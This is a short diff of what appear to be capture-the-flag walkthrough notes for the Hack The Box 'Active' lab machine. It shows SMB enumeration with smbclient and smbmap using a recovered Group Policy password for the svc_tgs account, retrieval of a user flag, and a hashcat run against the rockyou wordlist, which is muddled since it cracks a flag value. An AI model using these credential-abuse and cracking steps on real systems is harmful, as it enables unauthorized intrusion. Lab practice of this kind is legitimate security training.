@@ -95,5 +95,5 @@ smbclient \\\\Active\\Replication
  smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.100 -R Users -A user.txt -q
         cat user.txt :: 86d67d8ba232bb6a254aa4d10159e983 >hashsmb.txt
         hashcat hashsmb.txt /usr/share/wordlist/rockyou.txt
-
-        hash
+        
+**Part II: Bloodhound::**
